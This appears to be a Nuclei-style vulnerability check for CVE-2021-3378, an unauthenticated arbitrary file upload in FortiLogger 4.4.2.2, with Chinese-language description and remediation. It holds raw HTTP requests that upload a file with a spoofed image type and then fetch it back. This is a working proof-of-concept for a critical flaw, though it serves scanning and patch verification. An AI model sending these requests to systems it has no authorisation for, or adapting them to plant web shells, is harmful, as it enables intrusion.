id: CVE-2021-3378
info:
  name: FortiLogger 4.4.2.2 - Arbitrary File Upload
  author:
  - l0ne1y
  tags:
  - cve
  - cve2021
  - fortilogger
  - fortigate
  - fortinet
  description: |-
    FortiLogger任意文件上传漏洞
    RZK Fortilogger是土耳其RZK公司的一个可为Windows系统上FortiGate防火墙进行即时状态跟踪，日志记录，搜索/过滤，报告和热点等功能的建站系统。

    FortiLogger 4.4.2.2 存在安全漏洞，该漏洞源于受任意文件上传的影响。
  reference:
  - https://erberkan.github.io/2021/cve-2021-3378/
  - https://github.com/erberkan/fortilogger_arbitrary_fileupload
  - http://packetstormsecurity.com/files/161601/fortilogger-4.4.2.2-arbitrary-file-upload.html
  - http://packetstormsecurity.com/files/161974/fortilogger-arbitrary-file-upload.html
  severity: critical
  classification:
    cve-id:
    - cve-2021-3378
    cwe-id:
    - cwe-434
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |-
    **官方修复方案**
    建议用户到官方获取最新补丁或者最新版本程序：https://www.fortilogger.com/

    **临时修复方案**
    1、服务器端将文件上传目录直接设置为不可执行。
    2、文件类型检查：建议使用白名单方式（比黑名单更可靠），并结合MIME Type、后缀检查等方式（文件类型做白名单限制）。此外对于图片的处理可以使用压缩函数或resize函数，处理图片的同时破坏其包含的HTML代码。
    3、使用随机数改写文件名和文件路径，使得用户不能轻易访问自己上传的文件。
    4、单独设置文件服务器的域名。
    5、验证文件内容，使用正则匹配恶意代码（过滤恶意代码各种绕过方式，如大小写、BASE64编码）限制上传。
    6、修复服务器可能存在的解析漏洞。
    7、严格限制可以修改服务器配置的文件上传如：.htaccess。
    8、隐藏上传文件路径。
    9、升级Web Server。
    10、及时修复Web上传代码。
    11、不能有本地文件包含漏洞。
    12、注意0x00截断攻击（PHP更新到最新版本）。
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - '{{randstr}}'
  - type: word
    condition: and
    part: header
    words:
    - text/plain
    - ASP.NET
  matchers-condition: and
  raw:
  - |
    POST /Config/SaveUploadedHotspotLogoFile HTTP/1.1
    Host: {{Hostname}}
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS
    Accept: application/json
    Referer: {{BaseURL}}
    Connection: close
    X-Requested-With: XMLHttpRequest

    ------WebKitFormBoundarySHHbUsfCoxlX1bpS
    Content-Disposition: form-data; name="file"; filename="poc.txt"
    Content-Type: image/png

    {{randstr}}

    ------WebKitFormBoundarySHHbUsfCoxlX1bpS
  - |
    GET /Assets/temp/hotspot/img/logohotspot.txt HTTP/1.1
    Host: {{Hostname}}
